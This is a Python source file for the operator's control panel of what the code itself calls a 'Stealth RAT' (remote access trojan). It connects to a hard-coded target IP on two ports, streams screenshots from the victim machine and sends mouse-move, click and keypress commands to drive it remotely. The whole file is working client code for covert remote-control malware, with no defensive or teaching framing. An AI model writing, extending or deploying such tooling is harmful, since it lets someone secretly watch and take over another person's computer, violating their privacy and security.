import socket
import tkinter as tk
from PIL import Image, ImageTk
import io
import time

# === CONFIGURATION ===
TARGET_IP = "192.168.0.167"   # Change to the controlled laptop's IP address
CMD_PORT = 9090
SCREEN_PORT = 9091
REFRESH_MS = 150              # milliseconds between screen updates

def send_cmd(cmd):
    """Send a text command (mouse move, click, keypress) to the RAT."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((TARGET_IP, CMD_PORT))
        s.send((cmd + "\n").encode())
        resp = s.recv(4096).decode()
        s.close()
        print(resp)
    except Exception as e:
        print(f"Cmd error: {e}")

def get_screenshot():
    """Request a screenshot from the RAT and return a PIL Image."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((TARGET_IP, SCREEN_PORT))
        s.send(b"screenshot\n")
        # Use file wrapper with utf-8-sig to automatically strip BOM
        s_file = s.makefile('rb')
        header_line = s_file.readline()
        header = header_line.decode('utf-8-sig').strip()
        if not header.startswith("IMG"):
            s_file.close()
            s.close()
            return None
        size = int(header.split()[1])
        # Read the exact number of bytes of the JPEG image
        data = s_file.read(size)
        s_file.close()
        s.close()
        img = Image.open(io.BytesIO(data))
        return img
    except Exception as e:
        print(f"Screen error: {e}")
        return None

class RemoteDesktop:
    def __init__(self, root):
        self.root = root
        self.root.title("Remote Control - Stealth RAT")
        # Make the window full-screen (F11 style) – uncomment if desired
        # self.root.attributes('-fullscreen', True)
        # To exit full-screen, press Escape (bound below)

        self.canvas = tk.Canvas(root, bg="black")
        self.canvas.pack(fill=tk.BOTH, expand=True)

        # Bind mouse and keyboard events
        self.canvas.bind("<Button-1>", self.left_click)
        self.canvas.bind("<Button-3>", self.right_click)
        self.canvas.bind("<Double-Button-1>", self.double_click)
        self.canvas.bind("<B1-Motion>", self.drag)
        self.canvas.bind("<Motion>", self.mouse_move)
        self.root.bind("<Key>", self.key_press)
        self.root.bind("<Escape>", lambda e: self.root.attributes('-fullscreen', False))  # Exit full-screen with Esc
        self.root.focus_set()

        self.remote_width = 0
        self.remote_height = 0
        self.current_image = None

        self.update_screen()

    def update_screen(self):
        """Fetch a screenshot, resize to fit canvas, and display it."""
        img = get_screenshot()
        if img:
            self.remote_width, self.remote_height = img.size
            canvas_w = self.canvas.winfo_width() if self.canvas.winfo_width() > 1 else 800
            canvas_h = self.canvas.winfo_height() if self.canvas.winfo_height() > 1 else 600
            # Stretch the image to exactly fill the canvas (ignores aspect ratio)
            img_resized = img.resize((canvas_w, canvas_h), Image.Resampling.LANCZOS)
            self.current_image = ImageTk.PhotoImage(img_resized)
            self.canvas.delete("all")
            # Place the image at the top-left corner (NW)
            self.canvas.create_image(0, 0, anchor=tk.NW, image=self.current_image)
        self.root.after(REFRESH_MS, self.update_screen)

    def map_coords(self, event):
        """Map canvas coordinates to remote screen coordinates (full canvas stretch)."""
        if self.remote_width == 0 or self.current_image is None:
            return (0,0)
        canvas_w = self.canvas.winfo_width()
        canvas_h = self.canvas.winfo_height()
        remote_x = int(event.x * self.remote_width / canvas_w)
        remote_y = int(event.y * self.remote_height / canvas_h)
        remote_x = max(0, min(self.remote_width-1, remote_x))
        remote_y = max(0, min(self.remote_height-1, remote_y))
        return (remote_x, remote_y)

    def mouse_move(self, event):
        x, y = self.map_coords(event)
        send_cmd(f"mousemove {x} {y}")

    def left_click(self, event):
        send_cmd("mouseclick")

    def right_click(self, event):
        send_cmd("mouseclick right")

    def double_click(self, event):
        send_cmd("mouseclick")
        time.sleep(0.05)
        send_cmd("mouseclick")

    def drag(self, event):
        x, y = self.map_coords(event)
        send_cmd(f"mousemove {x} {y}")

    def key_press(self, event):
        key = event.keysym
        if key == "Return":
            key = "ENTER"
        elif key == "space":
            key = "SPACE"
        elif key == "Tab":
            key = "TAB"
        elif key == "BackSpace":
            key = "BACKSPACE"
        elif key == "Escape":
            key = "ESC"
        elif len(key) == 1:
            key = key.upper()
        else:
            return
        send_cmd(f"keypress {key}")

if __name__ == "__main__":
    root = tk.Tk()
    app = RemoteDesktop(root)
    root.mainloop()